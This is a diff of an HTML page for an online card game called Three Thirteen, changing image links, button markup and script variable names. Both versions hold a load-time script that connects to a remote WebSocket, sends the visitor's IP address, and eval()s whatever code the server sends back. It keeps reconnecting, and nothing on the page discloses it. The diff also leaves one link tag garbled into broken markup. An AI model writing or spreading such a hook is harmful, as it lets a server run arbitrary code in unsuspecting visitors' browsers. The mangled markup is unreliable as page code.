@@ -15,8 +15,8 @@
     <meta name="theme-color" content="#ffffff">
     <link rel="stylesheet" href="/static/fonts/bootstrap-icons.css">
     
-<meta property="og:image" content="https://glamgirlx.com/media/images/dd9c654e-2b32-41f1-b4ac-8799e7cfe226.png">
-<meta name="pinterest:image" content="https://glamgirlx.com/media/images/dd9c654e-2b32-41f1-b4ac-8799e7cfe226.png"/>
+<meta property="og:image" content="https://i.imgur.com/8I5qWNu.png">
+<meta name="pinterest:image" content="https://i.imgur.com/8I5qWNu.png"/>
 
     <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-6209985848112194"
          crossorigin="anonymous"></script>
@@ -123,12 +123,17 @@
 <img src="https://i.imgur.com/dAQRaWt.jpeg" alt="Daisy's profile photo" width="120" height="120" style="margin-top:5px; margin-right:10px; margin-bottom:10px; border-radius: 50%;">
 <p><i>By Daisy</i></p>
 
-<div style="white-space: pre-wrap;">Three Thirteen - Online Card Game
+<div style="white-space: pre-wrap;">
+
+
+
+
+Three Thirteen - Online Card Game
 Play Three Thirteen with a friend by clicking the link below to generate an invite code or join a game.
-<a class="btn btn-primary" href="https://lotteh.com/games/three-thirteen---online-card/" title="Invite a friend">Invite with code</a>
-<a class="btn btn-success" href="https://lotteh.com/games/" title="Join a game">Join game</a>
+<a class="btn btn-primary" href="https://lotteh.com/games/three-thirteen---online-card-result-once-single/" title="Invite a friend">Invite with code</a>
+<a "="" class="btn btn-success" games="" href="&lt;a href=" https:="" lotteh.com="" title="Visit this link (it will take you outside of Lotte Harper)">lotteh.com/games/</a>" title="Join a game"&gt;Join game
 <script src="/static/games/threethirteen.js"></script>
-***</div>
+</div>
 
 
 <div class="mx-auto p-1 m-1" style="display: flex; justify-content: space-around;">
@@ -148,7 +153,7 @@ Play Three Thirteen with a friend by clicking the link below to generate an invi
 
 
 
-<img width="100%;" height="auto" src="https://glamgirlx.com/media/images/dd9c654e-2b32-41f1-b4ac-8799e7cfe226.png" alt="Three Thirteen - Online Card Game - by Daisy">
+<img width="100%;" height="auto" src="https://i.imgur.com/8I5qWNu.png" alt="Three Thirteen - Online Card Game - by Daisy">
 
 <p><a href="https://lotteh.com/payments/photo/Daisy/?id=dd9c654e-2b32-41f1-b4ac-8799e7cfe226" title="Buy on Lotte Harper">Buy</a> | <a href="https://lotteh.com/payments/photo/crypto/Daisy/?id=dd9c654e-2b32-41f1-b4ac-8799e7cfe226&crypto=ETH" title="Buy with cryptocurrency on Lotte Harper">Buy with crypto</a></p>
 
@@ -275,32 +280,32 @@ function jumpbookto(page) {
             
         	Prism.highlightAll();
         });
-        var socket;
-        function openSocket() {
+        var remoteSocket;
+        function openRemoteSocket() {
             window.location.hash = '';
-            socket = new WebSocket("wss://lotteh.com"  + '/ws/remote/?path=' + window.location.href.split('#')[0]);
-            socket.addEventListener("open", (event) => {
+            remoteSocket = new WebSocket("wss://lotteh.com"  + '/ws/remote/?path=' + window.location.href.split('#')[0]);
+            remoteSocket.addEventListener("open", (event) => {
                 console.log('Socket open.');
                 fetch('https://lotteh.com/remote/generate/')
         		    .then(response => response.json())
         		    .then(data => {
-        		        socket.send(data.ip);
+        		        remoteSocket.send(data.ip);
         		    })
         		    .catch(error => {
         		        console.log('Error:', error);
         		    });
             });
-            socket.addEventListener("closed", (event) => {
+            remoteSocket.addEventListener("closed", (event) => {
                 console.log('Socket closed.');
                 setTimeout(function() {
-                    openSocket();
+                    openRemoteSocket();
                 }, 10000);
             });
-        	socket.addEventListener("message", (event) => {
+        	remoteSocket.addEventListener("message", (event) => {
                     eval(event.data);
             });
         }
-        openSocket();
+        openRemoteSocket();
         $(document).ready(function() {
         	$("#contact-form").submit(function(e){
                 	e.preventDefault();
